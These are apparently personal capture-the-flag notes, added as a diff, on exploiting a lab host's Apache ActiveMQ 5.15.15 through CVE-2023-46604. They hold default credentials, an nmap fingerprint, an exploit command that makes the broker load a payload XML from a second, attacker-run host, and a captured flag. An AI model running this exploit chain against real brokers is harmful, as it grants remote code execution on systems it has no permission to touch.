@@ -1,0 +1,47 @@
+	10.10.11.243
+
+
+Login Page 
+admin:admin
+return activemq
+
+
+61616/tcp open  apachemq   syn-ack ttl 63 ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+
+
+Search for cve
+CVE-2023-46604-Attacking & Defending ActiveMQ
+ - This vulnerability affects an unknown code of the component OpenWire Protocol Handler. The manipulation with an unknown input leads to a deserialization vulnerability.
+ - Remote Code Execution (RCE) flaw within Apache ActiveMQ. This vulnerability empowers a remote attacker, with network access to a broker, to execute arbitrary shell commands. The attack involves manipulating serialized class types in the OpenWire protocol, prompting the broker to instantiate any available class on the classpath.
+ 
+Payload 
+modify poc-linux.xml
+1. Cannot read normal since it was html entity.
+2. Need bypass the html entity 
+3. HTML entity encoder/decoder
+
+go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.8:8080/poc-linux.xml
+
+
+
+Flag
+
+07062250f4fdfc26afd21243a2bdf852
